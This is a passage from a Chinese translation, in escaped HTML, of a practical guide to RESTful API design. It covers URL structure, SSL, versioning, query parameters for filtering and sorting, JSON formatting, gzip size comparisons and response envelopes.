  &lt;li&gt;&lt;a href=&quot;#requirements&quot;&gt;API是开发者的用户界面 - 所以多花点功夫使其更友好&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#restful&quot;&gt;使用RESTful的URL和action&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssl&quot;&gt;所有地方都要使用SSL，没有例外&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#docs&quot;&gt;一个API的好用与否取决于它的文档 - 所以文档要好好写&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#versioning&quot;&gt;通过URL来控制版本，不要通过header&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#advanced-queries&quot;&gt;使用查询参数来实现高级功能：过滤、排序和搜索&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#limiting-fields&quot;&gt;提供方法用来限制从API返回的字段&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#useful-post-responses&quot;&gt;对于POST、PATCH和PUT的请求返回一些有用的东西&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#hateoas&quot;&gt;HATEOAS当前还不太实用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#json-responses&quot;&gt;尽量使用JSON，迫不得已的时候使用XML&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#snake-vs-camel&quot;&gt;理论上你应该在JSON中使用驼峰格式，但是下划线格式的可读性比驼峰格式要高20%&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pretty-print-gzip&quot;&gt;默认情况API要输出完整的内容，并且要确认支持gzip&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#envelope&quot;&gt;默认情况下不要在响应内容的外边再套一层大括号&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#json-requests&quot;&gt;考虑对POST、PUT和PATCH等请求的body使用JSON格式&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pagination&quot;&gt;使用Link header分页&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#autoloading&quot;&gt;提供一种方法来自动加载相关资源的内容&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#method-override&quot;&gt;提供一种方法来覆盖HTTP方法&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#rate-limiting&quot;&gt;提供响应header用来对请求频次进行限制&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#authentication&quot;&gt;使用token来进行普通验证，当需要用户授权的时候使用OAuth2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#caching&quot;&gt;要在响应header中包含缓存所使用的header&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#errors&quot;&gt;定义一个容易理解的错误格式&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#http-status&quot;&gt;高效的使用HTTP状态码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;requirements&quot;&gt;API的关键要求&lt;/h2&gt;
&lt;p&gt;网上很多关于API设计的意见都是一些学术讨论，里边充斥着对模糊标准非常主观的解释，而不是讨论在现实世界中如何落地。这篇文章的目标是描述一个最佳实践：如何为当今的web应用设计一个务实的API。如果一个标准不合理，我不会去尝试满足这个标准。为了帮助决策过程进行，我写下了一些API必须要满足的要求：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;它应该使用合理的web标准&lt;/li&gt;
  &lt;li&gt;它应该对开发者友好，并且可以通过浏览器的地址栏就能浏览其功能&lt;/li&gt;
  &lt;li&gt;它应该是简单、直观并且一致的&lt;/li&gt;
  &lt;li&gt;它应该是高效，并且要跟其他要求保持平衡&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;API是开发者使用的UI - 就像任何UI一样，保证用户体验是很重要的。&lt;/p&gt;

&lt;h2 id=&quot;restful&quot;&gt;使用RESTful的URL和action&lt;/h2&gt;

&lt;p&gt;如果说有一个理念被广泛的采用，那就是RESTful原则。这些原则由&lt;a href=&quot;http://roy.gbiv.com/&quot;&gt;Roy Fielding&lt;/a&gt;在其博士论文
&lt;a href=&quot;http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm&quot;&gt;《network based software architectures》&lt;/a&gt;的&lt;a href=&quot;http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm&quot;&gt;第五章&lt;/a&gt;中被首次提出。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Representational_state_transfer&quot;&gt;REST&lt;/a&gt;的关键原则涉及到要把你的API分解成一种逻辑上的资源。这些资源可以通过有具体含义的HTTP方法（GET, POST, PUT, PATCH, DELETE）来进行修改。&lt;/p&gt;

&lt;h3 id=&quot;section&quot;&gt;但是我该怎么定义一个资源呢？&lt;/h3&gt;

&lt;p&gt;当然，这些资源应该是&lt;a href=&quot;https://blog.apigee.com/detail/restful_api_design_nouns_are_good_verbs_are_bad&quot;&gt;名词（不是动词！）&lt;/a&gt;，这样对API消费者来说更容易理解。可能你内部的模型跟资源之间是一对一的映射关系，但这不是必须的。这里所说的重点是不要把内部实现的细节暴露到你的API之中。&lt;/p&gt;

&lt;p&gt;一旦定义好了你的资源，你需要指明对这些资源都可以做什么操作以及如何通过你的API来实现。RESTful原则提供了一个使用HTTP方法来实现&lt;a href=&quot;http://en.wikipedia.org/wiki/Create,_read,_update_and_delete&quot;&gt;CRUD&lt;/a&gt;操作的策略，如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets&lt;/code&gt; - 获取ticket列表&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets/12&lt;/code&gt; - 获取指定的ticket&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;POST /tickets&lt;/code&gt; - 创建一个新的ticket&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PUT /tickets/12&lt;/code&gt; - 更新id为12的ticket&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PATCH /tickets/12&lt;/code&gt; - 对id为12的ticket进行部分更新&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE /tickets/12&lt;/code&gt; - 删除id为12的ticket&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;REST牛逼的地方在于你只需要在&lt;code class=&quot;highlighter-rouge&quot;&gt;/tickets&lt;/code&gt;这个单一入口上利用已经存在的HTTP方法来实现有意义的功能。除此之外你不需要额外的方法命名规则，并且URL结构也很清晰。REST万岁！&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;接入端的名字应该是单数还是复数呢？&lt;/h3&gt;

&lt;p&gt;这里我们遵循keep-it-simple原则。尽管有人会告诉你使用复数来描述一个资源实例是错的，但是务实的做法是为了保持URL格式的一致，都要使用复数。不需要处理odd pluralization问题 (person/people, goose/geese) 对于API消费者来说更友好，并且对于API提供者来说也更容易实现（因为大部分现代框架默认情况下会在同一个普通的controller中同时处理&lt;code class=&quot;highlighter-rouge&quot;&gt;/tickets&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;/tickets/12&lt;/code&gt;这类的请求）。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;但是如何处理资源之间的关系呢？&lt;/h3&gt;

&lt;p&gt;如果关系只存在于另一个资源，RESTful原则提供了一个有用的指引。让我们通过一个例子来看一下。&lt;a href=&quot;http://www.enchant.com/&quot;&gt;Enchant&lt;/a&gt;中的一个ticket由很多message构成。这些message可以通过以下形式逻辑性地映射到/tickets这个接入端口上：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets/12/messages&lt;/code&gt; - 获取ticket#12中的message列表&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets/12/messages/5&lt;/code&gt; - 获取ticket #12中message#5的内容&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;POST /tickets/12/messages&lt;/code&gt; - 在ticket #12创建新的message&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PUT /tickets/12/messages/5&lt;/code&gt; - 更新ticket #12中message #5的内容&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;PATCH /tickets/12/messages/5&lt;/code&gt; - 更新ticket #12中message #5的部分内容&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE /tickets/12/messages/5&lt;/code&gt; - 删除ticket #12中的message #5&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;或者，如果关系可以独立于资源存在，那么在资源内容的输出中只包含关系id就可以了。之后API消费者不得不再去访问关系的入口。不过，如果这个关系跟资源存在一起，那么API可以提供一个功能，自动把这个关系的内容嵌入其中，从而避免重复访问API。&lt;/p&gt;

&lt;h3 id=&quot;crudaction&quot;&gt;对于不能映射成CRUD操作的action该怎么办？&lt;/h3&gt;

&lt;p&gt;这是容易引起困惑的地方。这里有几个解决方案：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;把action映射成一个资源的一个字段。如果这个action没有参数的话这么做是可以的。举个例子，&lt;code class=&quot;highlighter-rouge&quot;&gt;activate&lt;/code&gt;这个action可以映射成一个boolean类型的&lt;code class=&quot;highlighter-rouge&quot;&gt;activated&lt;/code&gt;字段，然后可以通过PATCH方法来更新这个资源。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在RESTful原则下，把它当作的子资源（sub-resource）来对待。比如，GitHub的API允许你通过&lt;code class=&quot;highlighter-rouge&quot;&gt;PUT /gists/:id/star&lt;/code&gt;来&lt;a href=&quot;http://developer.github.com/v3/gists/#star-a-gist&quot;&gt;收藏一个gist&lt;/a&gt;，通过&lt;code class=&quot;highlighter-rouge&quot;&gt;DELETE /gists/:id/star&lt;/code&gt;来&lt;a href=&quot;http://developer.github.com/v3/gists/#unstar-a-gist&quot;&gt;取消收藏&lt;/a&gt;。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;有时候你真的没有办法把action映射到一个合理的RESTful结构上。比如，通用搜索这个操作就没法被映射到一个指定的资源入口上。这种情况下， &lt;code class=&quot;highlighter-rouge&quot;&gt;/search&lt;/code&gt;是最好的选择，即使它不是一个资源。这没什么问题 - 尽可能做对API消费者有益的设计，并确保有清晰的文档说明，以免造成困惑。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ssl&quot;&gt;所有地方都要使用SSL - 没有例外&lt;/h2&gt;

&lt;p&gt;一定要使用SSL。没有例外。如今，你的web API可以从任何有互联网的地方（像图书馆，咖啡馆，机场等等）被访问到。这些地方并不都是安全的。很多地方根本没有对网络连接进行加密，如果认证凭证被劫持的话，这样访问者很容易被窃听或者被冒充。&lt;/p&gt;

&lt;p&gt;一直使用SSL的另一个优势是，加密的连接简化了用户认证的工作 - 你可以使用简单的access token，而不需要对每个API请求进行签名。&lt;/p&gt;

&lt;p&gt;需要注意的一件事是以非SSL的形式访问API的URL。不要把请求跳转到它们的SSL版本上。直接抛出一个严重错误！&lt;/p&gt;

&lt;h2 id=&quot;docs&quot;&gt;文档&lt;/h2&gt;

&lt;p&gt;一个API的好用与否取决于它的文档。文档应该很容易被找到并且能够公开访问。大部分开发者在尝试进行任何集成之前都会先看看文档。当文档被隐藏在一个PDF文件里或者需要登录才能查看的时候，这样做文档不仅很难被找到而且也很不容易被检索。&lt;/p&gt;

&lt;p&gt;文档应该有一些完整展示请求-响应过程的例子。请求的例子应该是可以直接粘贴使用的 - 链接可以直接被粘贴到浏览器或者curl例子可以被粘贴到终端里执行。&lt;a href=&quot;http://developer.github.com/v3/gists/#list-gists&quot;&gt;GitHub&lt;/a&gt;和&lt;a href=&quot;https://stripe.com/docs/api&quot;&gt;Stripe&lt;/a&gt;在这方面做得就很好。&lt;/p&gt;

&lt;p&gt;一旦你发布一个公共API，实际上你已经承诺不会在没有通知的情况下把它搞挂。文档中API更新的地方必须包含功能将要被废弃的时间表以及细节。更新应该通过博客（比如changelog）或者通过邮件列表来发布（二者都有的话就更完美了）。&lt;/p&gt;

&lt;h2 id=&quot;versioning&quot;&gt;版本控制&lt;/h2&gt;

&lt;p&gt;你要始终对自己的API进行版本控制。版本控制可以帮助你更快的迭代，并且可以防止无效的请求访问新的API。这还可以帮助你平滑过渡任何大版本的升级，在这个过程中你还可以继续提供老版本的API一段时间。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/389169/best-practices-for-api-versioning&quot;&gt;API的版本信息究竟是应该包含在URL里边还是header里边&lt;/a&gt;，围绕着这个目前存在分歧。从学术上来讲，版本信息应该放在header里边。但是为了保证能够通过浏览器去浏览资源的不同版本，版本信息应该放在URL里边（还记得在文章开始的地方指定的对API的要求吗？）。&lt;/p&gt;

&lt;p&gt;我是&lt;a href=&quot;https://stripe.com/docs/api#versioning&quot;&gt;StripeAPI版本控制方式&lt;/a&gt;的拥趸 - URL包含大版本号（v1），但是API还有基于日期的子版本，可以使用一个自定义的HTTP header来选择。在这种情况下，大版本作为一个整体保证了API数据结构的稳定，同时子版本可以用来交付一些小的更新（比如废弃某些字段，接入端变更等等）。&lt;/p&gt;

&lt;p&gt;一个API永远不会完全稳定。变化是必然的。重点是变化该如何管理。对于大部分API来说，在文档中提前给出更新计划的时间表就可以了。这么做对于行业和API的潜在消费者来说比较负责。&lt;/p&gt;

&lt;h2 id=&quot;advanced-queries&quot;&gt;结果过滤、排序以及搜索&lt;/h2&gt;

&lt;p&gt;最好尽可能保持资源的基础URL精简。复杂的结果过滤、排序等要求和高级搜索（当被限制在一个单独的资源上）都可以通过简单得在基础URL上添加查询参数来实现。让我们看看具体例子：&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;过滤&lt;/h3&gt;

&lt;p&gt;为每个实现了过滤功能的字段都提供一个唯一的查询参数。举个例子，当从&lt;code class=&quot;highlighter-rouge&quot;&gt;/tickets&lt;/code&gt;请求一个ticket列表的时候，你可能只想要state是open的那些。这可以通过类似于&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?state=open&lt;/code&gt;这类请求来实现。我们在这里通过state查询参数实现了一个过滤器。&lt;/p&gt;

&lt;p&gt;排序：跟过滤很像，我们可以用一个通用的&lt;code class=&quot;highlighter-rouge&quot;&gt;sort&lt;/code&gt;参数来描述排序规则。为了满足复杂的排序要求，sort参数可以接收以逗号分隔的字段列表，每个字段可以负号来表示降序。让我们来看一些例子：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?sort=-priority&lt;/code&gt; - 获取ticket的列表，按照priority降序排列&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?sort=-priority,created_at&lt;/code&gt; - 获取ticket的列表，先按照priority降序排列，然后再按照created_at升序排列。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;搜索&lt;/h3&gt;

&lt;p&gt;有时候基本的过滤器功能不够，你需要全文搜索功能。可能你正在使用&lt;a href=&quot;http://www.elasticsearch.org/&quot;&gt;ElasticSearch&lt;/a&gt;或者其他基于&lt;a href=&quot;http://lucene.apache.org/&quot;&gt;Lucene&lt;/a&gt;的技术。当全文搜索成为获取某类资源信息的方法的时候，这个功能就可以通过资源API的查询参数提供出来。比如&lt;code class=&quot;highlighter-rouge&quot;&gt;q&lt;/code&gt;。搜索的查询条件应该直接传给搜索引擎，API返回的格式应该跟普通列表查询一样。&lt;/p&gt;

&lt;p&gt;把以上这些合并在一起，我们可以得到以下查询：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?sort=-updated_at&lt;/code&gt; - 获取最近更新的ticket&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?state=closed&amp;amp;sort=-updated_at&lt;/code&gt; - 获取最近关闭的ticket&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets?q=return&amp;amp;state=open&amp;amp;sort=-priority,created_at&lt;/code&gt; - 获取提到了&lt;code class=&quot;highlighter-rouge&quot;&gt;return&lt;/code&gt;这个词的优先级最高的ticket&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;对常用的查询设置别名&lt;/h3&gt;

&lt;p&gt;为了给用户提供更好的API体验，可以考虑把多个查询条件合并成更容易访问的RESTful路径。比如，上面提到过的查询最近关闭的ticket列表就可以被合并成&lt;code class=&quot;highlighter-rouge&quot;&gt;GET /tickets/recently_closed&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;limiting-fields&quot;&gt;对API返回的字段进行限制&lt;/h2&gt;

&lt;p&gt;API消费者并不都一直需要资源的所有内容。提供按需返回字段的能力对API消费者最小化网络流量，并且加快他们对API的调用大有益处。&lt;/p&gt;

&lt;p&gt;你可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;fields&lt;/code&gt;查询参数，这个参数的内容是以逗号分隔的字段列表。举个例子，下面的请求将会获取到足够多的信息来展示状态为open的ticket的排序列表：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /tickets?fields=id,subject,customer_name,updated_at&amp;amp;state=open&amp;amp;sort=-updated_at
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;useful-post-responses&quot;&gt;更新和创建操作应该返回资源内容&lt;/h2&gt;

&lt;p&gt;PUT、POST或者PATCH操作可能会对资源的底层字段进行修改，这些字段并没有在API中提供（比如created_at或者updated_at这类的时间戳）。为了防止API消费者重复更新资源，这个API要在响应中包含updated（或者created）字段。&lt;/p&gt;

&lt;p&gt;如果是用POST来创建一个资源，那么返回&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.5&quot;&gt;201状态码&lt;/a&gt;并在&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.30&quot;&gt;Location header&lt;/a&gt;中指明新资源的URL。&lt;/p&gt;

&lt;h2 id=&quot;hateoas&quot;&gt;你该用HATEOAS吗？&lt;/h2&gt;

&lt;p&gt;对于到底是API消费者自己生成链接还是API提供链接，有很多不同的意见。RESTful设计原则提出了&lt;a href=&quot;https://blog.apigee.com/detail/hateoas_101_introduction_to_a_rest_api_style_video_slides&quot;&gt;HATEOAS&lt;/a&gt;，其大体上的意思是：与API的交互动作应该由API返回的metadata提供，而不是基于外部信息。&lt;/p&gt;

&lt;p&gt;尽管web已经工作在HATEOAS原则上（比如我们访问一个网站的首页以及根据我们当前访问的内容自动生成的其他链接），但是我并不认为我们现在在API上使用HATEOAS是合适的。当浏览一个网站的时候，该点击什么链接是在运行的时候决定的。但是，对于API来说，该发起什么请求是在进行API集成的时候决定的，而不是运行的时候。这个决定能延迟到运行的时候再做吗？当然可以，但是通过代码来控制该调用什么API仍然没法解决在不停机的情况下应对API更新的问题，所以这么做没有多大益处。这么说来，我认为HATEOAS只是一个承诺，但现在的时机并不成熟。还有许多标准需要指定，许多工具需要开发，这样才能让人认识到它的潜力。&lt;/p&gt;

&lt;p&gt;现在看来，最好在API的响应内容中包含资源标识符，以便API消费者用来创建以后需要访问的链接。使用标识符有很多优势 - 这可以使网络传输的数据最小化，并且API消费者需要存储的数据也被最小化了（他们只存储标识符而不是存储包含标识符的整个URL）。&lt;/p&gt;

&lt;p&gt;还有一点，这篇文章提倡把版本号放在URL里边，API消费者存储资源标识符而不是URL从长远来看是合理的。毕竟，无论版本如何变化标识符是稳定的，而URL则不是。&lt;/p&gt;

&lt;h2 id=&quot;json-responses&quot;&gt;响应格式只使用JSON&lt;/h2&gt;

&lt;p&gt;是时候在API中放弃XML了。XML臃肿，难解析，难读，并且它的数据模型和大部分编程语言的数据模型不兼容，而且它的扩展优势基本用不上，因为你主要的需求是把资源的内部表现形式以一种序列化的形式输出。&lt;/p&gt;

&lt;p&gt;我不会花功夫再解释以上观点了，因为好像很多公司(&lt;a href=&quot;http://apiblog.youtube.com/2012/12/the-simpler-yet-more-powerful-new.html&quot;&gt;YouTube&lt;/a&gt;, &lt;a href=&quot;https://dev.twitter.com/docs/api/1.1/overview#JSON_support_only&quot;&gt;Twitter&lt;/a&gt; &amp;amp; &lt;a href=&quot;http://developers.blog.box.com/2012/12/14/v2_api/&quot;&gt;Box&lt;/a&gt;)都开始抛弃XML了。&lt;/p&gt;

&lt;p&gt;我给你们看看Google Trends的图表(&lt;a href=&quot;http://www.google.com/trends/explore?q=xml+api#q=xml%20api%2C%20json%20api&amp;amp;cmpt=q&quot;&gt;XML API vs JSON API&lt;/a&gt;)来帮助你们思考：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/45fd1909d5d3d898d5a70622e112b1dd.jpg&quot; alt=&quot;xml-vs-json-api&quot;&gt;&lt;/p&gt;

&lt;p&gt;不过，如果你的客户中存在大量的企业客户，那么你将不得不支持XML。如果你必须这么做，你将会面临一个新的问题：&lt;/p&gt;

&lt;p&gt;数据格式的选择到底是通过Accept header实现还是通过URL实现？为了能够通过浏览器查看，应该通过URL来实现。最合理的方法是在URL后面加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;.json&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;.xml&lt;/code&gt;扩展名。&lt;/p&gt;

&lt;h2 id=&quot;snake-vs-camel&quot;&gt;字段名称采用下划线还是驼峰命名方式&lt;/h2&gt;

&lt;p&gt;如果你在使用JSON(JavaScript Object Notation)作为你API的主要输出格式，那么「正确」的做法是遵循JavaScript的命名规则 - 这意味着字段名要使用驼峰方式命名！如果你又去为各种语言开发客户端库的话，你最好使用每种语言各自的命名惯例 - C#和Java使用驼峰命名方式，python和ruby使用下划线命名方式。&lt;/p&gt;

&lt;p&gt;深思：我一直觉得&lt;a href=&quot;http://en.wikipedia.org/wiki/Snake_case&quot;&gt;下划线命名方式&lt;/a&gt;比JavaScript的&lt;a href=&quot;http://en.wikipedia.org/wiki/CamelCase&quot;&gt;驼峰命名方式&lt;/a&gt;要更易读。只是我没有任何证据来支持我的内心感觉，直到现在为止。基于2010年&lt;a href=&quot;http://ieeexplore.ieee.org/xpl/articleDetails.jsp?tp=&amp;amp;arnumber=5521745&quot;&gt;《eye tracking study on camelCase and snake_case》&lt;/a&gt;(&lt;a href=&quot;http://www.cs.kent.edu/~jmaletic/papers/ICPC2010-CamelCaseUnderScoreClouds.pdf&quot;&gt;PDF&lt;/a&gt;)研究，下划线格式比驼峰格式的可读性要高20%！这可能会影响到API以及文档中例子的可读性。&lt;/p&gt;

&lt;p&gt;很多流行的JSON API都是使用下划线命名方式。我怀疑这么做的原因可能是因为序列化库使用了底层语言的命名规则。我们可能需要JSON序列化库自身能够处理命名规则的转换。&lt;/p&gt;

&lt;h2 id=&quot;pretty-print-gzip&quot;&gt;默认情况下不要过滤API输出中的空格，并且要支持gzip&lt;/h2&gt;

&lt;p&gt;如果对API的输出结果进行空格压缩，从浏览器访问的话，体验很差。即使通过一些查询参数（比如&lt;code class=&quot;highlighter-rouge&quot;&gt;?pretty=true&lt;/code&gt;）可以输出不过滤空格的内容，但是对于一个API来说默认输出未过滤空格的内容是更友好的。额外增加的数据传输是微不足道的，特别是当开启gzip之后。&lt;/p&gt;

&lt;p&gt;考虑一些使用场景：如果一个API消费者正在debug，并在代码中把从API接收到的数据打印了出来 - 默认情况下必须是可读的。这些是小事，但是这些小事可以使API用起来更舒服。&lt;/p&gt;

&lt;h3 id=&quot;section-6&quot;&gt;额外的数据传输到底有多大？&lt;/h3&gt;

&lt;p&gt;让我们看一个真实的例子。GitHub的API默认情况下是不压缩空格的，我从中拉下来了一些数据。我也会做一些gzip方面的对比：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl https://api.github.com/users/veesahni &amp;gt; with-whitespace.txt
$ ruby -r json -e &#39;puts JSON JSON.parse(STDIN.read)&#39; &amp;lt; with-whitespace.txt &amp;gt; without-whitespace.txt
$ gzip -c with-whitespace.txt &amp;gt; with-whitespace.txt.gz
$ gzip -c without-whitespace.txt &amp;gt; without-whitespace.txt.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这几个文件的大小如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;without-whitespace.txt&lt;/code&gt; - 1252 bytes&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;with-whitespace.txt&lt;/code&gt; - 1369 bytes&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;without-whitespace.txt.gz&lt;/code&gt; - 496 bytes&lt;/li&gt;
  &lt;li&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;with-whitespace.txt.gz&lt;/code&gt; - 509 bytes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在这个例子中，当没开启gzip的时候，空格在输出内容中的大小占8.5%，当gzip开启的时候占2.6%。换句话说，gzip压缩可以节省60%的带宽。既然保留输出结果中的空格的成本相对来说很小，那么最好默认情况下保留空格并且开启gzip压缩！&lt;/p&gt;

&lt;p&gt;为了巩固这个观点，我们来看看其他几个例子，Twitter发现当在其&lt;a href=&quot;https://dev.twitter.com/docs/streaming-apis&quot;&gt;Streaming API&lt;/a&gt;上开启gzip压缩的时候能&lt;a href=&quot;https://dev.twitter.com/blog/announcing-gzip-compression-streaming-apis&quot;&gt;节省80%的流量&lt;/a&gt;（某些情况下）。Stack Exchange做得更绝，&lt;a href=&quot;https://api.stackexchange.com/docs/compression&quot;&gt;从不返回一个未经压缩的响应内容&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;envelope&quot;&gt;默认情况下不要再外层套一个大括号，但是当需要的时候可以加&lt;/h2&gt;

&lt;p&gt;很多API都会像下面一样在它们的响应内容外边套一个大括号：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;John&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这么做有很多理由 - 这使得在响应中添加额外的元数据（metadata）或分页信息很容易，因为一些REST客户端访问HTTP header不是很容易，并且&lt;a href=&quot;http://en.wikipedia.org/wiki/JSONP&quot;&gt;JSONP&lt;/a&gt;请求根本无法访问HTTP header。随着像&lt;a href=&quot;http://www.w3.org/TR/cors/&quot;&gt;CORS&lt;/a&gt;和&lt;a href=&quot;http://tools.ietf.org/html/rfc5988#page-6&quot;&gt;RFC 5988中的Link header&lt;/a&gt;等标准的快速通过，这么做变得没有任何必要。&lt;/p&gt;

&lt;p&gt;我们默认情况下还是不要在外边嵌套大括号，除了一些特殊情况。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;特殊情况下该如何嵌套大括号呢？&lt;/h3&gt;

&lt;p&gt;两种情况下需要嵌套大括号 - 如果API需要支持JSONP跨域访问或者客户端无法访问HTTP header。&lt;/p&gt;

